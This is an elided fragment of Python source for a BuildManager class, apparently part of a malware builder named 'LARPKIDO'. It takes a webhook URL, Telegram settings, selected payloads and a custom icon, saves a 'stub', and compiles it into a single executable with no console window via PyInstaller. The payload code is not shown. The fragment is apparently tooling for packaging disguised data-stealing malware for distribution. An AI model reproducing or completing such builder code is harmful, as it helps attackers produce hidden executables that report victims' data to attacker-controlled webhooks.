...
class BuildManager:
    ...
    def buildFinal(compress, webhook_url, selected_payloads, file_name, file_type, file_icon_path, telegram_config, log):
        try:
            ...
            log(f"LARPKIDO: stub saved to {py_name}")
            
            if file_type == "exe":
                log("LARPKIDO: compiling to exe...")
                cmd = [
                    "py", "-m", "PyInstaller",
                    "--onefile",
                    "--noconsole",
                ...
                if process.returncode == 0:
                    log(f"LARPKIDO: success - output/{os.path.basename(file_name)}.exe")
                    # Cleanup build files
                    try:
                    ...
                    log(f"LARPKIDO: pyinstaller failed with code {process.returncode}")
                    return False
            else:
                log("LARPKIDO: build finished (python stub only)")
                return True
                
        except Exception as e:
            log(f"LARPKIDO: exception - {str(e)}")
            return False
